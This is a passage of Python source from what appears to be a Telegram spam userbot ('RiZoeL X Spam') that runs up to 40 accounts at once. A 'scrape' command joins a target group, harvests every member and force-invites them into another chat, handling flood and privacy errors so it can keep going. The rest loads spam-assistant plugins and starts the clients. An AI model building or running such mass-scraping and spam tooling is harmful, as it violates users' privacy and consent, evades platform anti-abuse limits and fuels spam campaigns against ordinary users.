@Riz18.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz19.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz20.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz21.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz22.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz23.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz24.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz25.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz26.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz27.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz28.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz29.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz30.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz31.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz32.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz33.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz34.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz35.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz36.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz37.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz38.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz39.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
@Riz40.on(events.NewMessage(incoming=True, pattern=r"\%sscrape(?: |$)(.*)" % hl))
async def get_users(event):
    if event.sender_id == OWNER_ID or event.sender_id in DEV:
        fukyou = event.text.split(" ", 1)
        group = fukyou[1]
        if group.startswith("https://t.me/") or group.startswith("@"):
             await event.client(functions.channels.JoinChannelRequest(group))
             peer = 0
             a = 0
             Add_Msg = await event.client.send_message(event.chat_id, f"__️Scraping Users From: {group}__")
             async for sex in event.client.iter_participants(group, aggressive=True):
             #   await Add_Msg.edit(f"**• Scraping Users •** \n\n • __From Chat:__ {group} \n • __Users added:__ `{a}` \n\n **© @RiZoeLX**")
                try:
                   await event.client(InviteToChannelRequest(event.chat_id, [sex]))
                   await asyncio.sleep(3)
                   a += 1
                except FloodWaitError as s:
                #   await Add_Msg.edit(f"**FloodWaitError for** `{s.seconds}` **sec**\n\n **Users Added:** `{a}` \n **Scrape Group**: `{group}`")
                   return
                except UserPrivacyRestrictedError:
                   print("PrivacyRestrictedError")
                except UserAlreadyParticipantError:
                   print("User Already In Group")
                except UserBannedInChannelError:
                   print("User Banned in Group")
                except ChatAdminRequiredError:
                   print("Error: To Add Members Chat Admin Required")
                 #  await Add_Msg.edit(f"**Error 404 !!** \nTo Add Members Chat Admin Required")
                   return
                except ValueError:
                   print(f"Error: Can't Find Group/channel")
                #   await Add_Msg.edit(f"**Error 204 !!** \n Can't Find Group/Channel")
                   return
                except PeerFloodError:
                 if peer == 10:
                    print("PeerFloodError")
                    peer += 1  
                   # await Add_Msg.edit(f"**Error 102 !!** \n PeerFloodError !")
                    return
                except RPCError as ok:
                   print(f"ok.__class__.__name__")
                except Exception as e:
                   print(e)
             return await Add_Msg.edit(f"**• Users Added •** \n\n • __From Chat:__ {group} \n • __Users added:__ `{a}` \n\n **© @RiZoeLX**")
 
#=========== Assistants ===========

def Start_Assistant(shortname):
    if shortname.startswith("__"):
        pass
    elif shortname.endswith("_"):
        import importlib
        import sys
        from pathlib import Path
        from importlib import util
        path = Path(f"assistant/{shortname}.py")
        name = "assistant.{}".format(shortname)
        spec = util.spec_from_file_location(name, path)
        mod = util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        print("Checking Bot Token......")
        print("Starting Bot")
    else:
        import importlib
        import sys
        from pathlib import Path
        from importlib import util
        path = Path(f"assistant/{shortname}.py")
        name = "assistant.{}".format(shortname)
        spec = util.spec_from_file_location(name, path)
        mod = util.module_from_spec(spec)
        mod.Riz = Riz
        mod.Riz2 = Riz2
        mod.Riz3 = Riz3
        mod.Riz4 = Riz4
        mod.Riz5 = Riz5
        mod.Riz6 = Riz6
        mod.Riz7 = Riz7
        mod.Riz8 = Riz8
        mod.Riz9 = Riz9
        mod.Riz10 = Riz10
        mod.Riz11 = Riz11
        mod.Riz12 = Riz12
        mod.Riz13 = Riz13
        mod.Riz14 = Riz14
        mod.Riz15 = Riz15
        mod.Riz16 = Riz16
        mod.Riz17 = Riz17
        mod.Riz18 = Riz18
        mod.Riz19 = Riz19
        mod.Riz20 = Riz20
        mod.Riz21 = Riz21
        mod.Riz22 = Riz22
        mod.Riz23 = Riz23
        mod.Riz24 = Riz24
        mod.Riz25 = Riz25
        mod.Riz26 = Riz26
        mod.Riz27 = Riz27
        mod.Riz28 = Riz28
        mod.Riz29 = Riz29
        mod.Riz30 = Riz30
        mod.Riz31 = Riz31
        mod.Riz32 = Riz32
        mod.Riz33 = Riz33
        mod.Riz34 = Riz34
        mod.Riz35 = Riz35
        mod.Riz36 = Riz36
        mod.Riz37 = Riz37
        mod.Riz38 = Riz38
        mod.Riz39 = Riz39
        mod.Riz40 = Riz40
        mod.DEV = DEV
        mod.SUDO_USERS = SUDO_USERS
        spec.loader.exec_module(mod)
        sys.modules["assistant" + shortname] = mod


def load_Assistant(shortname):
    if shortname.startswith("__"):
        pass
    elif shortname.endswith("_"):
        import importlib
        import sys
        from pathlib import Path
        from importlib import util
        path = Path(f"assistant/plugins/{shortname}.py")
        name = "assistant.plugins.{}".format(shortname)
        spec = util.spec_from_file_location(name, path)
        mod = util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        print("> Loading Spam Assistant < \n")
        print("• XSpam Assistant Imported:" + shortname)
    else:
        import importlib
        import sys
        from pathlib import Path
        from importlib import util
        path = Path(f"assistant/plugins/{shortname}.py")
        name = "assistant.plugins.{}".format(shortname)
        spec = util.spec_from_file_location(name, path)
        mod = util.module_from_spec(spec)
        mod.Riz = Riz
        mod.Riz2 = Riz2
        mod.Riz3 = Riz3
        mod.Riz4 = Riz4
        mod.Riz5 = Riz5
        mod.Riz6 = Riz6
        mod.Riz7 = Riz7
        mod.Riz8 = Riz8
        mod.Riz9 = Riz9
        mod.Riz10 = Riz10
        mod.Riz11 = Riz11
        mod.Riz12 = Riz12
        mod.Riz13 = Riz13
        mod.Riz14 = Riz14
        mod.Riz15 = Riz15
        mod.Riz16 = Riz16
        mod.Riz17 = Riz17
        mod.Riz18 = Riz18
        mod.Riz19 = Riz19
        mod.Riz20 = Riz20
        mod.Riz21 = Riz21
        mod.Riz22 = Riz22
        mod.Riz23 = Riz23
        mod.Riz24 = Riz24
        mod.Riz25 = Riz25
        mod.Riz26 = Riz26
        mod.Riz27 = Riz27
        mod.Riz28 = Riz28
        mod.Riz29 = Riz29
        mod.Riz30 = Riz30
        mod.Riz31 = Riz31
        mod.Riz32 = Riz32
        mod.Riz33 = Riz33
        mod.Riz34 = Riz34
        mod.Riz35 = Riz35
        mod.Riz36 = Riz36
        mod.Riz37 = Riz37
        mod.Riz38 = Riz38
        mod.Riz39 = Riz39
        mod.Riz40 = Riz40
        mod.DEV = DEV
        mod.SUDO_USERS = SUDO_USERS
        spec.loader.exec_module(mod)
        sys.modules["assistant.plugins." + shortname] = mod
        print("• XSpam Assistant imported:" + shortname)

if BOT_TOKEN:
    print("Setting up Assisting Bot")
    path = "assistant/*.py"
    files = glob.glob(path)
    for name in files:
        with open(name) as f:
            path1 = Path(f.name)
            shortname = path1.stem
            Start_Assistant(shortname.replace(".py", ""))

if BOT_TOKEN:
    path = "assistant/plugins/*.py"
    files = glob.glob(path)
    for name in files:
        with open(name) as f:
            path1 = Path(f.name)
            shortname = path1.stem
            load_Assistant(shortname.replace(".py", ""))
    print("Assisting Bot set up completely!")

loop.run_until_complete(logss())
print("RiZoeL X Spam Successfully deployed -!")
print("Enjoy! Do visit @RiZoeLX")

if len(argv) not in (1, 3, 4):
    try:
        Riz.disconnect()
    except Exception as e:
        pass
    try:
        Riz2.disconnect()
    except Exception as e:
        pass
    try:
        Riz3.disconnect()
    except Exception as e:
        pass
    try:
        Riz4.disconnect()
    except Exception as e:
        pass
    try:
        Riz5.disconnect()
    except Exception as e:
        pass
    try:
        Riz6.disconnect()
    except Exception as e:
        pass
    try:
        Riz7.disconnect()
    except Exception as e:
        pass
    try:
        Riz8.disconnect()
    except Exception as e:
        pass
    try:
        Riz9.disconnect()
    except Exception as e:
        pass
    try:
        Riz10.disconnect()
    except Exception as e:
        pass
    try:
        Riz11.disconnect()
    except Exception as e:
        pass
    try:
        Riz12.disconnect()
    except Exception as e:
        pass
    try:
        Riz13.disconnect()
    except Exception as e:
        pass
    try:
        Riz14.disconnect()
    except Exception as e:
        pass
    try:
        Riz15.disconnect()
    except Exception as e:
        pass
    try:
        Riz16.disconnect()
    except Exception as e:
        pass
    try:
        Riz17.disconnect()
    except Exception as e:
        pass
    try:
        Riz18.disconnect()
    except Exception as e:
        pass
    try:
        Riz19.disconnect()
    except Exception as e:
        pass
    try:
        Riz20.disconnect()
    except Exception as e:
        pass
    try:
        Riz21.disconnect()
    except Exception as e:
        pass
    try:
        Riz22.disconnect()
    except Exception as e:
        pass
    try:
        Riz23.disconnect()
    except Exception as e:
        pass
    try:
        Riz24.disconnect()
    except Exception as e:
        pass
    try:
        Riz25.disconnect()
    except Exception as e:
        pass
    try:
        Riz26.disconnect()
    except Exception as e:
        pass
    try:
        Riz27.disconnect()
    except Exception as e:
        pass
    try:
        Riz28.disconnect()
    except Exception as e:
        pass
    try:
        Riz29.disconnect()
    except Exception as e:
        pass
    try:
        Riz30.disconnect()
    except Exception as e:
        pass
    try:
        Riz31.disconnect()
    except Exception as e:
        pass
    try:
        Riz32.disconnect()
    except Exception as e:
        pass
    try:
        Riz33.disconnect()
    except Exception as e:
        pass
    try:
        Riz34.disconnect()
    except Exception as e:
        pass
    try:
        Riz35.disconnect()
    except Exception as e:
        pass
    try:
        Riz36.disconnect()
    except Exception as e:
        pass
    try:
        Riz37.disconnect()
    except Exception as e:
        pass
    try:
        Riz38.disconnect()
    except Exception as e:
        pass
    try:
        Riz39.disconnect()
    except Exception as e:
        pass
    try:
        Riz40.disconnect()
    except Exception as e:
        pass
else:
    try:
        Riz.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz2.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz3.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz4.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz5.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz6.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz7.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz8.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz9.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz10.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz11.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz12.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz13.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz14.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz15.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz16.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz17.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz18.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz19.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz20.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz21.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz22.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz23.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz24.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz25.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz26.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz27.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz28.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz29.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz30.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz31.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz32.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz33.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz34.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz35.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz36.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz37.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz38.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz39.run_until_disconnected()
    except Exception as e:
        pass
    try:
        Riz40.run_until_disconnected()
    except Exception as e:
        pass
